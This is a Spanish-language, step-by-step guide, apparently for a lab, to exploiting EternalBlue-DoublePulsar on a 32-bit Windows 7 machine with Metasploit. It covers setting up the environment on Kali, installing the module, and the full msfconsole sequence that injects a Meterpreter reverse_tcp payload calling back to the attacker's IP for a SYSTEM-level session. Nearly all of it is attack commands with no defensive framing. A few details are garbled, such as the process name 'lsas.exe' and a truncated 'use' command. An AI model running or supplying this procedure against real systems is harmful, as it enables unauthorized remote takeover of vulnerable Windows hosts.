# Guía práctica para explotación de Eternalblue-DoublePulsar sobre Windows 7 - i386 

## Procedimiento

## Preparación de entorno
Se debe instalar el programa wine y agregar la arquitectura de 32bits al sistema, para esto ejecutaremos los pasos siguientes:

- root@kali:~#  apt-get install wine -y
- root@kali:~#  apt-get install winetricks -y
- root@kali:~#  dpkg –add-architecture i386 && apt-get update && apt-get install wine32 -y
## 1) Instalación del módulo en Metasploit
- Clonar el repositorio de Eternalblue-DoublePulsar 
- root@kali:~#  git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
- root@kali:~#  cd Eternalblue-Doublepulsar-Metasploit/
- Copiar el archivo eternalblue_doublepulsar.rb a la siguiente dirección: /usr/share/metasploit-framework/modules/exploits/windows/smb/
- Crear la estructura de directorios ‘/root/shadowbroker/windows/lib/x86-Windows/’ y copiar la carpeta deps en  ‘/root/shadowbroker/windows/lib/x86-Windows/’
- Abrir una terminal y tipear el comando winecfg para que se cree la carpeta /root/.wine/drive_c/
## 2) Explotación    
- Abrir una terminal y iniciar metasploit con el comando msfconsole
- Llamamos al exploit con el path exploit/windows/smb/eternalblue_doublepulsar
  - msf5 > use exploit    
- vemos las opciones disponibles 
  - msf5 > show options
- Ingresamos la IP y el puerto (por defecto 445) del objetivo
  - msf5 > set RHOST (IP víctima)
- Seleccionamos el sistema objetivo
  - msf5 > show targets
  - msf5 > set target 8
- Seleccionamos el proceso en cual se va a inyectar el payload, es muy importante tener en cuenta que tipo de arquitectura se va a atacar, por defecto el proceso a inyectar es wlms.exe, esto funciona con equipos de 32 bits, si nuestra víctima utiliza un sistema de 64bits se debe cambiar de proceso a lsas.exe, de lo contrario el exploit fallará.
  - msf5 > set PROCESSINJECT wlms.exe    (si es de 32bits)
  - msf5 > set PROCESSINJECT lsas.exe        (si es de 64bits)
- Seleccionamos la arquitectura del sistema que vamos a atacar (x32 o x64) en nuestro caso 32 bits
  - msf5 > set TARGETARCHITECTURE x32
- Seleccionamos el payload, en nuestro caso un meterpreter, y lo configuramos 
  - msf5 > set PAYLOAD windows/meterpreter/reverse_tcp
  - msf5 > set LHOST (IP atacante)
- Revisamos una última vez que estén correctamente configurados todos los parámetros
  - msf5 > show options
- Finalmente usamos el comando exploit y obtendremos una sesión remota de meterpreter con privilegios de System en la máquina víctima

## Materiales y recursos
1- Máquina atacante con Kali Linux y Metasploit
2- Exploit Eternalblue-DoublePulsar (https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)
3- Máquina víctima, Windows 7 con arquitectura de 32bits 
